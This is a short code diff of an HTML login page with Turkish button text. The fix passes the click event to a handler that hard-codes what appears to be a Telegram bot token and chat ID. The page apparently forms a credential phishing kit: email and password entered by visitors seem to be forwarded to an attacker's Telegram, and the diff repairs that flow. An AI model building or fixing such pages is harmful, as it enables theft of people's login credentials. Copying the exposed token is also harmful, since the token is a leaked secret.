@@ -10,11 +10,11 @@
     <form>
     <input type="email" id="email" required>
     <input type="password" id="password" required>
-    <button onclick="sendMessage()">GİRİŞ YAP</button>
+    <button onclick="sendMessage(event)">GİRİŞ YAP</button>
     </form>
     
     <script>
-        async function sendMessage() {
+        async function sendMessage(event) {
             event.preventDefault();
             const token = '7941593080:AAFe71WQaxyQFzvI3CcpFtuOcOthvUrF49A';
             const userId = 7767108844;
